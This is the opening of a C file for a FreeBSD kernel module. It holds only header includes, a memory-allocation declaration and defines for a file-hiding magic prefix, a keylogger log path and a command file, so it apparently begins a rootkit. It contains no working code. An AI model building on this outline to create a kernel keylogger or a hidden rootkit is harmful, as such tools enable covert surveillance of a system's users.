#include <sys/fcntl.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/pcpu.h>
#include <sys/syscallsubr.h>
#include <sys/file.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/linker.h>
#include <sys/libkern.h>
#include <sys/dirent.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/ioccom.h>
#include <sys/dirent.h>
#include <sys/malloc.h>

#include <vm/vm.h>
#include <vm/vm_page.h> 
#include <vm/vm_map.h>

#define VERBOSE 0

#define MAGIC_PREFIX "azula"
#define KEYLOGGER "/var/log/azula"
#define COMMANDS "/tmp/azula" //Come back for this


MALLOC_DECLARE(M_TEMPBUFFER);
MALLOC_DEFINE(M_TEMPBUFFER, "SHORT DESCRIP", "LONG DESCRIP");
